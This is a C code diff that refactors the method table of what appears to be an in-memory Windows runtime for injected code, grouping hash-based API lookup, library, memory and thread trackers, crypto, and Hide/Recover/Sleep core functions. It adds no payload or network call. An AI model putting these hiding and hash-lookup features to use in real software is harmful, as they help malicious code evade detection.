@@ -284,54 +284,61 @@ Runtime_M* InitRuntime(Runtime_Opts* opts)
     // create methods for Runtime
     Runtime_M* module = (Runtime_M*)moduleAddr;
     // about hash api
-    module->FindAPI   = GetFuncAddr(&RT_FindAPI);
-    module->FindAPI_A = GetFuncAddr(&RT_FindAPI_A);
-    module->FindAPI_W = GetFuncAddr(&RT_FindAPI_W);
+    module->HashAPI.FindAPI   = GetFuncAddr(&RT_FindAPI);
+    module->HashAPI.FindAPI_A = GetFuncAddr(&RT_FindAPI_A);
+    module->HashAPI.FindAPI_W = GetFuncAddr(&RT_FindAPI_W);
     // library tracker
-    module->LoadLibraryA   = runtime->LibraryTracker->LoadLibraryA;
-    module->LoadLibraryW   = runtime->LibraryTracker->LoadLibraryW;
-    module->LoadLibraryExA = runtime->LibraryTracker->LoadLibraryExA;
-    module->LoadLibraryExW = runtime->LibraryTracker->LoadLibraryExW;
-    module->FreeLibrary    = runtime->LibraryTracker->FreeLibrary;
-    module->GetProcAddress = GetFuncAddr(&RT_GetProcAddress);
+    module->Library.LoadA   = runtime->LibraryTracker->LoadLibraryA;
+    module->Library.LoadW   = runtime->LibraryTracker->LoadLibraryW;
+    module->Library.LoadExA = runtime->LibraryTracker->LoadLibraryExA;
+    module->Library.LoadExW = runtime->LibraryTracker->LoadLibraryExW;
+    module->Library.Free    = runtime->LibraryTracker->FreeLibrary;
+    module->Library.GetProc = GetFuncAddr(&RT_GetProcAddress);
     // memory tracker
-    module->MemAlloc   = runtime->MemoryTracker->Alloc;
-    module->MemCalloc  = runtime->MemoryTracker->Calloc;
-    module->MemRealloc = runtime->MemoryTracker->Realloc;
-    module->MemFree    = runtime->MemoryTracker->Free;
+    module->Memory.Alloc   = runtime->MemoryTracker->Alloc;
+    module->Memory.Calloc  = runtime->MemoryTracker->Calloc;
+    module->Memory.Realloc = runtime->MemoryTracker->Realloc;
+    module->Memory.Free    = runtime->MemoryTracker->Free;
     // thread tracker
-    module->NewThread  = runtime->ThreadTracker->New;
-    module->ExitThread = runtime->ThreadTracker->Exit;
-    module->Sleep      = GetFuncAddr(&RT_Sleep);
+    module->Thread.New   = runtime->ThreadTracker->New;
+    module->Thread.Exit  = runtime->ThreadTracker->Exit;
+    module->Thread.Sleep = GetFuncAddr(&RT_Sleep);
     // argument store
-    module->GetArgValue   = runtime->ArgumentStore->GetValue;
-    module->GetArgPointer = runtime->ArgumentStore->GetPointer;
-    module->EraseArgument = runtime->ArgumentStore->Erase;
-    module->EraseAllArgs  = runtime->ArgumentStore->EraseAll;
+    module->Argument.GetValue   = runtime->ArgumentStore->GetValue;
+    module->Argument.GetPointer = runtime->ArgumentStore->GetPointer;
+    module->Argument.Erase      = runtime->ArgumentStore->Erase;
+    module->Argument.EraseAll   = runtime->ArgumentStore->EraseAll;
     // in-memory storage
 
+    // Windows File
+    module->WinFile.ReadFileA  = runtime->WinFile->ReadFileA;
+    module->WinFile.ReadFileW  = runtime->WinFile->ReadFileW;
+    module->WinFile.WriteFileA = runtime->WinFile->WriteFileA;
+    module->WinFile.WriteFileW = runtime->WinFile->WriteFileW;
+    // WinHTTP
+    
     // random module
-    module->RandBuf     = GetFuncAddr(&RandBuf);
-    module->RandBool    = GetFuncAddr(&RandBool);
-    module->RandInt64   = GetFuncAddr(&RandInt64);
-    module->RandUint64  = GetFuncAddr(&RandUint64);
-    module->RandInt64N  = GetFuncAddr(&RandInt64N);
-    module->RandUint64N = GetFuncAddr(&RandUint64N);
+    module->Random.Buf     = GetFuncAddr(&RandBuf);
+    module->Random.Bool    = GetFuncAddr(&RandBool);
+    module->Random.Int64   = GetFuncAddr(&RandInt64);
+    module->Random.Uint64  = GetFuncAddr(&RandUint64);
+    module->Random.Int64N  = GetFuncAddr(&RandInt64N);
+    module->Random.Uint64N = GetFuncAddr(&RandUint64N);
     // crypto module
-    module->Encrypt = GetFuncAddr(&EncryptBuf);
-    module->Decrypt = GetFuncAddr(&DecryptBuf);
+    module->Crypto.Encrypt = GetFuncAddr(&EncryptBuf);
+    module->Crypto.Decrypt = GetFuncAddr(&DecryptBuf);
     // compress module
-    module->Compress   = GetFuncAddr(&Compress);
-    module->Decompress = GetFuncAddr(&Decompress);
-    // runtime common methods
-    module->GetProcAddressByName   = GetFuncAddr(&RT_GetProcAddressByName);
-    module->GetProcAddressByHash   = GetFuncAddr(&RT_GetProcAddressByHash);
-    module->GetProcAddressOriginal = GetFuncAddr(&RT_GetProcAddressOriginal);
+    module->Compressor.Compress   = GetFuncAddr(&Compress);
+    module->Compressor.Decompress = GetFuncAddr(&Decompress);
+    // runtime IAT
+    module->IAT.GetProcByName   = GetFuncAddr(&RT_GetProcAddressByName);
+    module->IAT.GetProcByHash   = GetFuncAddr(&RT_GetProcAddressByHash);
+    module->IAT.GetProcOriginal = GetFuncAddr(&RT_GetProcAddressOriginal);
     // runtime core methods
-    module->SleepHR = GetFuncAddr(&RT_SleepHR);
-    module->Hide    = GetFuncAddr(&RT_Hide);
-    module->Recover = GetFuncAddr(&RT_Recover);
-    module->Exit    = GetFuncAddr(&RT_Exit);
+    module->Core.Sleep   = GetFuncAddr(&RT_SleepHR);
+    module->Core.Hide    = GetFuncAddr(&RT_Hide);
+    module->Core.Recover = GetFuncAddr(&RT_Recover);
+    module->Core.Exit    = GetFuncAddr(&RT_Exit);
     return module;
 }
 
@@ -553,8 +560,6 @@ static errno initRuntimeEnvironment(Runtime* runtime)
 
 static errno initModules(Runtime* runtime)
 {
-    typedef errno (*module_t)(Runtime* runtime, Context* context);
-
     // create context data for initialize other modules
     Context context = {
         .NotEraseInstruction = runtime->Options.NotEraseInstruction,
@@ -581,6 +586,8 @@ static errno initModules(Runtime* runtime)
         .DuplicateHandle       = runtime->DuplicateHandle,
         .CloseHandle           = runtime->CloseHandle,
     };
+
+    typedef errno (*module_t)(Runtime* runtime, Context* context);
 
     // initialize runtime submodules
     module_t submodules[] = 
@@ -1709,8 +1716,10 @@ static errno processEvent(Runtime* runtime, bool* exit)
     switch (eventType)
     {
     case EVENT_TYPE_SLEEP:
+        dbg_log("[runtime]", "trigger event: sleep");
         return sleepHR(runtime, sleepTime);
     case EVENT_TYPE_STOP:
+        dbg_log("[runtime]", "trigger event: stop");
         *exit = true;
         return NO_ERROR;
     default:
@@ -2014,6 +2023,8 @@ errno RT_Exit()
         runtime->LibraryTracker->Clean,
         runtime->MemoryTracker->Clean,
         runtime->ArgumentStore->Clean,
+
+        runtime->WinFile->Uninstall,
     };
     errno enmod = NO_ERROR;
     for (int i = 0; i < arrlen(submodules); i++)
